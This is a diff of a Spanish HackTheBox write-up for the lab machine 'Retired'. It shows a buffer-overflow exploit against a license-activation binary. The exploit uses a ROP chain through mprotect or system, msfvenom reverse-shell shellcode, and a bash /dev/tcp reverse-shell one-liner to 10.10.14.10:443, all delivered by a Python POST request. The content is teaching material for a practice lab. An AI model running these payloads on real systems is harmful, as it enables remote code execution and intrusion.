 <code><span class="ve">❯ msfvenom</span><span class="p"> -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f python -v shellcode  
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -739,23 +538,24 @@ shellcode </span><span class="o">+= </span><span class="no">b</span><span class=
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nuestro payload final enviara la <code class="language-plaintext highlighter-rouge">basura</code> hasta llegar al registro <code class="language-plaintext highlighter-rouge">RIP</code>, ahi colocara en los registros <code class="language-plaintext highlighter-rouge">RDX</code>, <code class="language-plaintext highlighter-rouge">RSI</code> y <code class="language-plaintext highlighter-rouge">RDX</code> los argumentos necesarios para la función <code class="language-plaintext highlighter-rouge">mprotect</code> y la llamara para modifcar los <code class="language-plaintext highlighter-rouge">permisos</code> y hacer la pila ejecutable, despues de ello con un <code class="language-plaintext highlighter-rouge">call</code> al registro <code class="language-plaintext highlighter-rouge">RSP</code> podremos ir a la pila y ejecutar ahi nuestro <code class="language-plaintext highlighter-rouge">shellcode</code></p>
-<a href="/hackthebox/retired/6.png" target="_blank"><div><p><img src="/hackthebox/retired/6.png"></p></div></a>
-
-<p class="plain-text">Simplemente nos queda definir el <code class="language-plaintext highlighter-rouge">payload</code> en el script y mediante una petición <code class="language-plaintext highlighter-rouge">POST</code> enviar el payload como archivo llamado <code class="language-plaintext highlighter-rouge">licensefile</code> a el php de la máquina victima</p>
+<p class="plain-text">Nuestra cadena <code class="language-plaintext highlighter-rouge">rop</code> establecerá los argumentos para <code class="language-plaintext highlighter-rouge">mprotect</code> con el fin de que al llamarlo modifique los privilegios del stack a <code class="language-plaintext highlighter-rouge">7</code> o <code class="language-plaintext highlighter-rouge">rwx</code> para hacerlo ejecutable, luego con un <code class="language-plaintext highlighter-rouge">call</code> al registro <code class="language-plaintext highlighter-rouge">rsp</code> podremos ejecutar nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> en la pila</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">p64(stack_start)
-payload </span><span class="o">+= </span><span class="p">pop_rsi </span><span class="o">+ </span><span class="p">p64(stack_size)
-payload </span><span class="o">+= </span><span class="p">pop_rdx </span><span class="o">+ </span><span class="p">p64(</span><span class="mi">7</span><span class="p">)
-payload </span><span class="o">+= </span><span class="p">mprotect
-payload </span><span class="o">+= </span><span class="p">call_rsp
-payload </span><span class="o">+= </span><span class="p">shellcode</span>
+<code><span class="p">payload  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x26796</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">  
+payload</span><span class="o"> +=</span><span class="p"> p64(stack_start)</span><span class="c1">         # addr</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x2890f</span><span class="p">)</span><span class="c1"> # pop rsi; ret;</span><span class="p">  
+payload</span><span class="o"> +=</span><span class="p"> p64(stack_size)</span><span class="c1">          # len</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0xcb1cd</span><span class="p">)</span><span class="c1"> # pop rdx; ret;</span><span class="p">  
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x7</span><span class="p">)</span><span class="c1">                 # prot</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base </span><span class="o">+</span><span class="mi"> 0xf8c20</span><span class="p">)</span><span class="c1"> # mprotect()</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x27a5e</span><span class="p">)</span><span class="c1"> # call rsp;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Luego de definir el <code class="language-plaintext highlighter-rouge">payload</code> en el script simplemente mediante una petición <code class="language-plaintext highlighter-rouge">POST</code> enviar el payload como archivo llamado <code class="language-plaintext highlighter-rouge">licensefile</code> a el php de la máquina victima</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">requests.post</span><span class="p">(</span><span class="s">"http://retired.htb/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
+<code><span class="p">requests.post</span><span class="p">(</span><span class="s">"http://10.10.11.154/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">El script final para ejecutar el <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> utilizando la función <code class="language-plaintext highlighter-rouge">mprotect</code> para cambiar los permisos de la pila y hacerla <code class="language-plaintext highlighter-rouge">ejecutable</code> quedaria de la siguiente manera</p>
@@ -767,23 +567,11 @@ payload </span><span class="o">+= </span><span class="p">shellcode</span>
 offset </span><span class="o">= </span><span class="mi">520</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-libc_base</span><span class="o"> = </span><span class="mi">0x7f82a824f000</span><span class="p">
+libc_base</span><span class="o"> = </span><span class="mi">0x7f670e288000</span><span class="p">
 
-stack_start </span><span class="o">= </span><span class="mi">0x7ffd16c4c000
-</span><span class="p">stack_end </span><span class="o">= </span><span class="mi">0x7ffd16c6d000
+stack_start </span><span class="o">= </span><span class="mi">0x7ffe3ea7d000
+</span><span class="p">stack_end </span><span class="o">= </span><span class="mi">0x7ffe3ea9e000
 </span><span class="p">stack_size</span><span class="o"> = </span><span class="p">stack_end </span><span class="o">- </span><span class="p">stack_start
-
-offset_mprotect </span><span class="o">= </span><span class="mi">0xf8c20</span><span class="p">
-offset_pop_rdi </span><span class="o">= </span><span class="mi">0x26796</span><span class="p">
-offset_pop_rsi </span><span class="o">= </span><span class="mi">0x2890f</span><span class="p">
-offset_pop_rdx </span><span class="o">= </span><span class="mi">0xcb1cd</span><span class="p">
-offset_call_rsp </span><span class="o">= </span><span class="mi">0x27a5e</span><span class="p">
-
-mprotect </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_mprotect)
-pop_rdi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rdi)
-pop_rsi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rsi)
-pop_rdx </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rdx)
-call_rsp </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_call_rsp)
 
 shellcode </span><span class="o">=</span><span class="no">  b</span><span class="s">""</span><span class="p">
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f</span><span class="s">"</span><span class="p">
@@ -794,16 +582,19 @@ shellcode </span><span class="o">+= </span><span class="no">b</span><span class=
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89</span><span class="s">"</span><span class="p">
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span><span class="p">
 
-payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">p64(stack_start)
-payload </span><span class="o">+= </span><span class="p">pop_rsi </span><span class="o">+ </span><span class="p">p64(stack_size)
-payload </span><span class="o">+= </span><span class="p">pop_rdx </span><span class="o">+ </span><span class="p">p64(</span><span class="mi">7</span><span class="p">)
-payload </span><span class="o">+= </span><span class="p">mprotect
-payload </span><span class="o">+= </span><span class="p">call_rsp
-payload </span><span class="o">+= </span><span class="p">shellcode
+payload  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x26796</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(stack_start)</span><span class="c1">         # addr</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x2890f</span><span class="p">)</span><span class="c1"> # pop rsi; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(stack_size)</span><span class="c1">          # len</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0xcb1cd</span><span class="p">)</span><span class="c1"> # pop rdx; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x7</span><span class="p">)</span><span class="c1">                 # prot</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base </span><span class="o">+</span><span class="mi"> 0xf8c20</span><span class="p">)</span><span class="c1"> # mprotect()</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x27a5e</span><span class="p">)</span><span class="c1"> # call rsp;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode
 
-requests.post</span><span class="p">(</span><span class="s">"http://retired.htb/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
+requests.post</span><span class="p">(</span><span class="s">"http://10.10.11.154/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">script</code> enviara la petición con nuestro payload y al programa interpretarla nos enviara una <code class="language-plaintext highlighter-rouge">revshell</code> en este caso como <code class="language-plaintext highlighter-rouge">www-data</code> a nuestro host</p>
@@ -829,58 +620,52 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <section class="post" id="bof-writable">
 <br><h3 class="post-title">Buffer Overflow - writable</h3><br>
 
-<p class="plain-text">Hay otro metodo bastante interesante de explotarlo, pero antes necesitaremos obtener del <code class="language-plaintext highlighter-rouge">maps</code> que vimos antes las direcciones <code class="language-plaintext highlighter-rouge">base</code> de libc y el binario</p>
+<p class="plain-text">Otro metodo de explotarlo es usando una sección writable, pero antes necesitaremos obtener del <code class="language-plaintext highlighter-rouge">maps</code> para obtener la dirección base de <code class="language-plaintext highlighter-rouge">libc</code> para los gadgets</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">libc_base </span><span class="o">= </span><span class="mi">0x7f82a824f000</span><span class="p">
-binary_base </span><span class="o">= </span><span class="mi">0x564086262000</span>
+<code><span class="p">libc_base </span><span class="o">= </span><span class="mi">0x7f670e288000</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">rabin2</code> para ver las secciones del binario, podemos ver una seccion <code class="language-plaintext highlighter-rouge">.data</code> donde tenemos los permisos <code class="language-plaintext highlighter-rouge">rw-</code> osea que podemos escribir en esta</p>
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">rabin2</code> para ver las secciones de <code class="language-plaintext highlighter-rouge">libc</code>, podemos ver una seccion <code class="language-plaintext highlighter-rouge">.data</code> donde tenemos los permisos <code class="language-plaintext highlighter-rouge">rw-</code> osea que podemos escribir en esta</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ rabin2 </span><span class="p">-S activate_license
+<code><span class="ve">❯ rabin2 </span><span class="p">-S libc-2.31.so
 [Sections]
 
-nth paddr        size vaddr       vsize perm name
-―――――――――――――――――――――――――――――――――――――――――――――――――
-0   0x00000000    0x0 0x00000000    0x0 ----
-1   0x000002a8   0x1c 0x000002a8   0x1c -r-- .interp
-2   0x000002c4   0x24 0x000002c4   0x24 -r-- .note.gnu.build-id  
-3   0x000002e8   0x20 0x000002e8   0x20 -r-- .note.ABI-tag
-4   0x00000308   0x28 0x00000308   0x28 -r-- .gnu.hash
-5   0x00000330  0x390 0x00000330  0x390 -r-- .dynsym
-6   0x000006c0  0x1cc 0x000006c0  0x1cc -r-- .dynstr
-7   0x0000088c   0x4c 0x0000088c   0x4c -r-- .gnu.version
-8   0x000008d8   0x30 0x000008d8   0x30 -r-- .gnu.version_r
-9   0x00000908   0xd8 0x00000908   0xd8 -r-- .rela.dyn
-10  0x000009e0  0x2d0 0x000009e0  0x2d0 -r-- .rela.plt
-11  0x00001000   0x17 0x00001000   0x17 -r-x .init
-12  0x00001020  0x1f0 0x00001020  0x1f0 -r-x .plt
-13  0x00001210    0x8 0x00001210    0x8 -r-x .plt.got
-14  0x00001220  0x601 0x00001220  0x601 -r-x .text
-15  0x00001824    0x9 0x00001824    0x9 -r-x .fini
-16  0x00002000  0x18b 0x00002000  0x18b -r-- .rodata
-17  0x0000218c   0x4c 0x0000218c   0x4c -r-- .eh_frame_hdr
-18  0x000021d8  0x140 0x000021d8  0x140 -r-- .eh_frame
-19  0x00002cb8    0x8 0x00003cb8    0x8 -rw- .init_array
-20  0x00002cc0    0x8 0x00003cc0    0x8 -rw- .fini_array
-21  0x00002cc8  0x200 0x00003cc8  0x200 -rw- .dynamic
-22  0x00002ec8  0x138 0x00003ec8  0x138 -rw- .got
-23  0x00003000   0x10 0x00004000   0x10 -rw- .data
-24  0x00003010    0x0 0x00004010    0x8 -rw- .bss
-25  0x00003010   0x27 0x00000000   0x27 ---- .comment
-26  0x00003037   0x30 0x00000000   0x30 ---- .debug_aranges
-27  0x00003067  0x688 0x00000000  0x688 ---- .debug_info
-28  0x000036ef  0x1b9 0x00000000  0x1b9 ---- .debug_abbrev
-29  0x000038a8  0x28a 0x00000000  0x28a ---- .debug_line
-30  0x00003b32  0x577 0x00000000  0x577 ---- .debug_str
-31  0x000040b0  0x960 0x00000000  0x960 ---- .symtab
-32  0x00004a10  0x437 0x00000000  0x437 ---- .strtab
-33  0x00004e47  0x13e 0x00000000  0x13e ---- .shstrtab</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Agregamos a nuestro <code class="language-plaintext highlighter-rouge">script</code> base la direccion de la seccion <code class="language-plaintext highlighter-rouge">.data</code> que es un offset</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">offset_writable </span><span class="o">= </span><span class="mi">0x4000</span>
+nth paddr           size vaddr          vsize perm type        name
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00000000       0x0 0x00000000       0x0 ---- NULL
+1   0x000002e0      0x24 0x000002e0      0x24 -r-- NOTE        .note.gnu.build-id
+2   0x00000304      0x20 0x00000304      0x20 -r-- NOTE        .note.ABI-tag
+3   0x00000328    0x34f4 0x00000328    0x34f4 -r-- HASH        .hash
+4   0x00003820    0x3cb4 0x00003820    0x3cb4 -r-- GNU_HASH    .gnu.hash
+5   0x000074d8    0xde30 0x000074d8    0xde30 -r-- DYNSYM      .dynsym
+6   0x00015308    0x60c1 0x00015308    0x60c1 -r-- STRTAB      .dynstr
+7   0x0001b3ca    0x1284 0x0001b3ca    0x1284 -r-- GNU_VERSYM  .gnu.version
+8   0x0001c650     0x470 0x0001c650     0x470 -r-- GNU_VERDEF  .gnu.version_d
+9   0x0001cac0      0x30 0x0001cac0      0x30 -r-- GNU_VERNEED .gnu.version_r
+10  0x0001caf0    0x7a28 0x0001caf0    0x7a28 -r-- RELA        .rela.dyn
+11  0x00024518     0x468 0x00024518     0x468 -r-- RELA        .rela.plt
+12  0x00025000     0x300 0x00025000     0x300 -r-x PROGBITS    .plt
+13  0x00025300      0x20 0x00025300      0x20 -r-x PROGBITS    .plt.got
+14  0x00025320  0x149439 0x00025320  0x149439 -r-x PROGBITS    .text
+15  0x0016e760     0xe4c 0x0016e760     0xe4c -r-x PROGBITS    __libc_freeres_fn
+16  0x00170000   0x23f18 0x00170000   0x23f18 -r-- PROGBITS    .rodata
+17  0x00193f20      0x1c 0x00193f20      0x1c -r-- PROGBITS    .interp
+18  0x00193f3c    0x61b4 0x00193f3c    0x61b4 -r-- PROGBITS    .eh_frame_hdr
+19  0x0019a0f0   0x1fae8 0x0019a0f0   0x1fae8 -r-- PROGBITS    .eh_frame
+20  0x001b9bd8     0x41b 0x001b9bd8     0x41b -r-- PROGBITS    .gcc_except_table
+21  0x001ba5e0      0x10 0x001bb5e0      0x10 -rw- PROGBITS    .tdata
+22  0x001ba5f0       0x0 0x001bb5f0      0x80 -rw- NOBITS      .tbss
+23  0x001ba5f0      0x10 0x001bb5f0      0x10 -rw- INIT_ARRAY  .init_array
+24  0x001ba600    0x2580 0x001bb600    0x2580 -rw- PROGBITS    .data.rel.ro
+25  0x001bcb80     0x1e0 0x001bdb80     0x1e0 -rw- DYNAMIC     .dynamic
+26  0x001bcd60     0x298 0x001bdd60     0x298 -rw- PROGBITS    .got
+27  0x001bd000     0x190 0x001be000     0x190 -rw- PROGBITS    .got.plt
+28  0x001bd1a0    0x1600 0x001be1a0    0x1600 -rw- PROGBITS    .data
+29  0x001be7a0      0xf0 0x001bf7a0      0xf0 -rw- PROGBITS    __libc_subfreeres
+30  0x001be8a0     0xd68 0x001bf8a0     0xd68 -rw- PROGBITS    __libc_IO_vtables
+31  0x001bf608       0x8 0x001c0608       0x8 -rw- PROGBITS    __libc_atexit
+32  0x001bf610       0x0 0x001c0620    0x3d50 -rw- NOBITS      .bss
+33  0x001bf610       0x0 0x001c4370     0x198 -rw- NOBITS      __libc_freeres_ptrs  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Lo que haremos sera ejecutar un comando con <code class="language-plaintext highlighter-rouge">system</code> asi que usando <code class="language-plaintext highlighter-rouge">readelf</code> buscaremos el offset de la funcion system en la libreria <code class="language-plaintext highlighter-rouge">libc</code> que descargamos</p>
@@ -889,95 +674,64 @@ nth paddr        size vaddr       vsize perm name
   1430: 0000000000048e50    45 FUNC    WEAK   DEFAULT   14 </span><span class="ro">system@@</span><span class="p">GLIBC_2.2.5  </span>
 </code></pre></div></div><br>
 
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">offset_system </span><span class="o">= </span><span class="mi">0x48e50</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Para cargar algunos argumentos necesitaremos hacer un <code class="language-plaintext highlighter-rouge">POP</code> a <code class="language-plaintext highlighter-rouge">RDI</code> y a <code class="language-plaintext highlighter-rouge">RSI</code>, usando <code class="language-plaintext highlighter-rouge">ropper</code> podemos buscar estos <code class="language-plaintext highlighter-rouge">gadgets</code> y agregarlos al script como offsets</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"pop rdi; ret;"</span><span class="p">  
-</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
-</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
-</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
-</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rdi; ret;
-
-</span><span class="ve">[INFO] </span><span class="p">File: libc-2.31.so
-</span><span class="ro">0x0000000000026796</span><span class="p">: </span><span class="am">pop </span><span class="p">rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span><span class="p"> 
-
-</span><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"pop rsi; ret;"</span><span class="p">  
-</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
-</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
-</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
-</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rsi; ret;
-
-</span><span class="ve">[INFO] </span><span class="p">File: libc-2.31.so
-</span><span class="ro">0x000000000002890f</span><span class="p">: </span><span class="am">pop </span><span class="p">rsi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span>
-</code></pre></div></div><br>
-
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">offset_pop_rdi </span><span class="o">= </span><span class="mi">0x26796
-</span><span class="p">offset_pop_rsi </span><span class="o">= </span><span class="mi">0x2890f</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Ademas de ello necesitaremos un <code class="language-plaintext highlighter-rouge">gadget</code> el cual nos ejecute una instruccion que mueva con <code class="language-plaintext highlighter-rouge">MOV</code> el contenido del registro <code class="language-plaintext highlighter-rouge">RSI</code> a lo que este en el registro <code class="language-plaintext highlighter-rouge">RDI</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"mov [rdi], rsi; ret;"</span><span class="p">  
-</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
-</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
-</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
-</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: mov [rdi], rsi; ret;
-
-</span><span class="ve">[INFO] </span><span class="p">File: libc-2.31.so
-</span><span class="ro">0x00000000000603b2</span><span class="p">: </span><span class="am">mov </span><span class="p">qword ptr [rdi], rsi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span>
-</code></pre></div></div><br>
-
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">offset_mov_rdi_rsi </span><span class="o">= </span><span class="mi">0x603b2</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Para obtener las direcciones <code class="language-plaintext highlighter-rouge">reales</code> de todas las instrucciones sumaremos las <code class="language-plaintext highlighter-rouge">bases</code> ya sea de libc o del binario dependiendo de donde conseguimos el <code class="language-plaintext highlighter-rouge">offset</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">writable </span><span class="o">= </span><span class="p">binary_base </span><span class="o">+</span><span class="p"> offset_writable
-
-system </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_system)
-pop_rdi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rdi)
-pop_rsi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rsi)
-mov_rdi_rsi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_mov_rdi_rsi)</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Con todos los recursos necesarios iniciemos con el <code class="language-plaintext highlighter-rouge">payload</code> lo primero sera enviar el <code class="language-plaintext highlighter-rouge">junk</code> el cual nos dejara en el registro <code class="language-plaintext highlighter-rouge">RIP</code> en espera de la siguiente instruccion</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""
-</span><span class="p">payload </span><span class="o">+= </span><span class="p">junk</span>
-</code></pre></div></div><br>
-
 <p class="plain-text">Lo que nos interesa es ejecutar un <code class="language-plaintext highlighter-rouge">oneliner</code> de bash el cual nos envie una reverse <code class="language-plaintext highlighter-rouge">shell</code>, por ahora lo definiremos y despues veremos como inyectarlo en el programa</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">command </span><span class="o">= </span><span class="no">b</span><span class="s">"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Aprovechandonos de los <code class="language-plaintext highlighter-rouge">gadgets</code> iterando por cada <code class="language-plaintext highlighter-rouge">8</code> bytes del comando al registro <code class="language-plaintext highlighter-rouge">RDI</code> enviaremos la direccion de la seccion <code class="language-plaintext highlighter-rouge">writable</code>, en el registro <code class="language-plaintext highlighter-rouge">RSI</code> guardaremos los <code class="language-plaintext highlighter-rouge">8</code> bytes del comando y asi con cada iteracion moveremos todo lo que hay en <code class="language-plaintext highlighter-rouge">RSI</code> que son 8 bytes a <code class="language-plaintext highlighter-rouge">RDI</code> que es la direccion de la seccion <code class="language-plaintext highlighter-rouge">writable</code> que ira subiendo por cada iteracion para no sobreescribir lo anterior, al terminar la seccion <code class="language-plaintext highlighter-rouge">writable</code> tendra como contenido nuestro <code class="language-plaintext highlighter-rouge">comando</code> de bash completo</p>
-<a href="/hackthebox/retired/9.png" target="_blank"><div><p><img src="/hackthebox/retired/9.png"></p></div></a>
-
-<p class="plain-text">Definimos la idea anterior en <code class="language-plaintext highlighter-rouge">python</code>, ademas usaremos <code class="language-plaintext highlighter-rouge">ljust</code> para asegurarnos que cada envio de datos tenga un tamaño de <code class="language-plaintext highlighter-rouge">8</code> bytes o rellenaremos con <code class="language-plaintext highlighter-rouge">\x00</code></p>
+<p class="plain-text">Nuestra cadena rop pretende guardar esta cadena en la sección .data para después pasarle esta dirección a system, sin embargo esta cadena solo podemos enviarla en <code class="language-plaintext highlighter-rouge">qwords</code> con un <code class="language-plaintext highlighter-rouge">mov</code> al desreferenciado de un registro, por lo que necesitaremos un gadget tipo <code class="language-plaintext highlighter-rouge">mov [???], ???; ret;</code> y sus respectivos <code class="language-plaintext highlighter-rouge">pops</code> a los registros</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="o">for </span><span class="p">i </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">, </span><span class="no">len</span><span class="p">(command), </span><span class="mi">8</span><span class="p">):
-    payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">p64(writable </span><span class="o">+ </span><span class="p">i)
-    payload </span><span class="o">+= </span><span class="p">pop_rsi </span><span class="o">+ </span><span class="p">command[i:i</span><span class="o">+</span><span class="mi">8</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)
-    payload </span><span class="o">+= </span><span class="p">mov_rdi_rsi</span>
+<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --console
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ro">(libc-2.31.so/ELF/x86_64)> </span><span class="p">search mov [rdi], rsi; ret;  
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: mov [rdi], rsi; ret;
+
+</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
+</span><span class="ro">0x00000000000603b2</span><span class="p">:</span><span class="am"> mov</span><span class="p"> qword ptr [rdi], rsi</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+
+</span><span class="ro">(libc-2.31.so/ELF/x86_64)> </span><span class="p">search pop rdi; ret;
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rdi; ret;
+
+</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
+</span><span class="ro">0x0000000000026796</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+
+</span><span class="ro">(libc-2.31.so/ELF/x86_64)></span><span class="p"> search pop rsi; ret;
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rsi; ret;
+
+</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
+</span><span class="ro">0x000000000002890f</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rsi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
+
+</span><span class="ro">(libc-2.31.so/ELF/x86_64)></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para terminar el payload en el registro <code class="language-plaintext highlighter-rouge">RDI</code> guardaremos la direccion de la seccion <code class="language-plaintext highlighter-rouge">writable</code> que contiene nuestro comando de bash, seguido de la funcion <code class="language-plaintext highlighter-rouge">system</code> que al leer el primer argumento de <code class="language-plaintext highlighter-rouge">RDI</code> ejecutara el oneliner y enviara la <code class="language-plaintext highlighter-rouge">shell</code></p>
-<a href="/hackthebox/retired/10.png" target="_blank"><div><p><img src="/hackthebox/retired/10.png"></p></div></a>
-
+<p class="plain-text">Iniciaremos el <code class="language-plaintext highlighter-rouge">payload</code> simplemente <code class="language-plaintext highlighter-rouge">junk</code> hasta antes de sobrescribir el retorno</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">p64(writable)
